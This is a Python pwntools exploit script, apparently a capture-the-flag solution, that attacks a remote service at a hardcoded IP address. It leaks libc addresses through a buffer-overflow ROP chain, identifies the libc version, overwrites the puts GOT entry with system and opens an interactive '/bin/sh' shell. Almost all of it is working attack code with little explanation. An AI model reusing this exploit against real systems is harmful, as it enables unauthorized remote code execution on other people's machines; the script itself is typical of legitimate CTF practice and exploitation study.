
from pwn import *

context.log_level = 'debug'
r = remote('104.154.106.182', 4567)

gets_plt = 0x08048330
gets_got = 0x80497ac
puts_plt = 0x08048340
puts_got = 0x80497b0
pr = 0x08048319
main = 0x0804847d

# stage 1: leak server side libc address to use libc-database
'''
p = 'a' * 0x8c
p += p32(puts_plt)
p += p32(pr)
p += p32(puts_got)
p += p32(puts_plt)
p += p32(pr)
p += p32(gets_got)

r.recvuntil(': ')
r.sendline(p)
r.recvuntil('\n')

leak1 = u32((r.recvuntil('\n'))[:4])
leak2 = u32((r.recvuntil('\n'))[:4])

#print 'puts :', hex(leak1)
#print 'gets :', hex(leak2)

$ ./find puts 7e0 gets e60
ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.14_i386)
epist@epist:~/Workspace/Pwnable/libc-database$ ./download libc6_2.19-0ubuntu6.14_i386
Getting libc6_2.19-0ubuntu6.14_i386
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/e/eglibc/libc6_2.19-0ubuntu6.14_i386.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.19-0ubuntu6.14_i386
'''
# these offset in libc-2.19.so
libc_system_offset = 0x40310
libc_puts_offset = 0x657e0
libc_binsh_offset = 0x162d4c

# stage 2: leak libc_base from puts's got and call main again
p2 = 'a' * 0x8c
p2 += p32(puts_plt)
p2 += p32(pr)
p2 += p32(puts_got)
p2 += p32(main)

r.recvuntil(': ')
r.sendline(p2)
r.recvuntil('\n')

leak = u32((r.recvuntil('\n'))[:4])
libc_base = leak - libc_puts_offset
system = libc_base + libc_system_offset
binsh = libc_base + libc_binsh_offset

# stage 3: overwrite puts_got to system and call with "/bin/sh"
p3 = 'a' * 0x8c
p3 += p32(gets_plt)
p3 += p32(pr)
p3 += p32(puts_got)
p3 += p32(puts_plt)
p3 += 'a' * 4
p3 += p32(binsh)

r.recvuntil(': ')
r.sendline(p3)
r.sendline(p32(system))
r.interactive()
